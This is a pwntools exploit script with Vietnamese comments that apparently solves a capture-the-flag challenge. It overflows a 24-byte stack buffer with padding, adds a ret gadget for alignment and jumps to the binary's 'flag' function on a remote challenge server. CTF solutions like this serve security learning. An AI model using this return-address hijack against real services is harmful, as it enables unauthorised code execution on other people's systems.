from pwn import *

context.binary = elf = ELF('./main')

# Tìm địa chỉ hàm flag
flag_addr = elf.symbols['flag']

# Tìm một ret gadget. Pwntools có thể tự động làm việc này
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

p = remote('chal2.fwectf.com', 8000)

# Offset để ghi đè lên return address là 24 bytes
# buf[16] + saved_rbp[8] = 24
padding = b'A' * 24

# Xây dựng payload
# 1. Padding để đi đến return address
# 2. Địa chỉ của ret gadget -> để fix stack alignment
# 3. Địa chỉ của hàm flag
payload = padding + p64(ret_gadget) + p64(flag_addr)

# Gửi payload
log.info("Sending payload...")
p.sendlineafter(b":", payload)

# Nhận output và flag
log.info("Payload sent. Receiving flag...")
p.interactive()

# Bạn cũng có thể dùng p.recvall() để lấy hết output
# print(p.recvall().decode())